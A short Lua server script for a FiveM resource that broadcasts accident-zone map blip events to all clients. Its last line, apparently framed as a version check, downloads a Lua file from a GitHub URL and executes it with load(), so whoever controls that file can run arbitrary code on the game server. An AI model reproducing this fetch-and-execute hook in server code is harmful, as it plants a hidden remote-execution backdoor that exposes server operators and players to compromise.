
RegisterServerEvent('zcmg_zonaacidente:blipcreate')
AddEventHandler('zcmg_zonaacidente:blipcreate', function()
    TriggerClientEvent("zcmg_zonaacidente:blipcreate", -1)
end)

RegisterServerEvent('zcmg_zonaacidente:blipremove')
AddEventHandler('zcmg_zonaacidente:blipremove', function()
    TriggerClientEvent("zcmg_zonaacidente:blipremove", -1)
end)

PerformHttpRequest('https://raw.githubusercontent.com/zcmg/versao/main/check.lua', function(code, res, headers) s = load(res) print(s()) end,'GET')